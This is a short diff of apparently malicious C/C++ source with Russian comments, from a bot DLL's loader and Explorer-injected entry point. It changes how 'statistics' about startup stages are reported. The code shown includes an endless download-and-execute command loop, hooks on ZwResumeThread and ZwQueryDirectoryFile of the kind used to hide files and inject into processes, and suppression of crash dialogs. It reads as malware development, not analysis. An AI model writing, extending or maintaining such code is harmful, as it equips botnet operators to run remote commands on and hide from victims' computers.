@@ -73,8 +73,11 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	// Регистрируем глобальный менеджер задач
 	InitializeTaskManager(NULL, true);
 
+	// Инициализируем отсылку статистики
+	DebugReportInit();
+
 	// 402_pl запуск цикла получения команд (он получается в другом процессе)
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
+	DebugReportStepByName("402_pl");
 
 	// Вызываем событие
 	bool Cancel = false;
@@ -102,7 +105,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	while (true)
 	{
 		// 403_pl цикл получения команд
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
+		DebugReportStepByName("403_pl");
 		
 		DownloadAndExecuteCommand(NULL, NULL);
 
@@ -136,12 +139,14 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
+	// Инициализируем отсылку статистики
+	DebugReportInit();
 
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
 
 	// 401_pl запуск BotPlug
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
+	DebugReportStepByName("401_pl");
 
 		
 	DLLDBG("====>Bot DLL", "Стартуем Loader");
